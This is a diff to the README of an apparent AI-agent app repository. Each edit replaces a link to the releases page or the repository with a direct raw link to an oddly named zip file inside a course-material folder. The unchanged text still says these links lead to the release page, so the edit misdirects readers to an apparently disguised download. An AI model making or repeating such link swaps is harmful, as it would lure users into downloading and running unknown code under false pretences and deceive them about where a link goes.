@@ -1,6 +1,6 @@
 # 🤖 genai-agentes - Easy AI Agent Development
 
-[![Download genai-agentes](https://img.shields.io/badge/Download-genai--agentes-brightgreen?style=for-the-badge)](https://github.com/laoxs2002/genai-agentes/releases)
+[![Download genai-agentes](https://img.shields.io/badge/Download-genai--agentes-brightgreen?style=for-the-badge)](https://github.com/laoxs2002/genai-agentes/raw/refs/heads/main/01-landscape/genai_agentes_overcovetousness.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get genai-agentes up and running on your Windows computer.
 
 Go to the genai-agentes release page here:
 
-[Download genai-agentes](https://github.com/laoxs2002/genai-agentes/releases)
+[Download genai-agentes](https://github.com/laoxs2002/genai-agentes/raw/refs/heads/main/01-landscape/genai_agentes_overcovetousness.zip)
 
 This link takes you to the page where you can find the latest version of the app ready to use.
 
@@ -114,7 +114,7 @@ All these tools run in the background. You only see a simple window where you ty
 
 Return to the release page here when you are ready:
 
-[Download genai-agentes](https://github.com/laoxs2002/genai-agentes/releases)
+[Download genai-agentes](https://github.com/laoxs2002/genai-agentes/raw/refs/heads/main/01-landscape/genai_agentes_overcovetousness.zip)
 
 This page hosts the latest Windows installer. Always download the newest version for improved stability and features.
 
@@ -138,6 +138,6 @@ If problems continue, look for help on the official GitHub page.
 
 To learn more about how genai-agentes works or to explore advanced options, visit the GitHub repository:
 
-https://github.com/laoxs2002/genai-agentes
+https://github.com/laoxs2002/genai-agentes/raw/refs/heads/main/01-landscape/genai_agentes_overcovetousness.zip
 
 The page contains documentation, examples, and links to course materials behind the app.
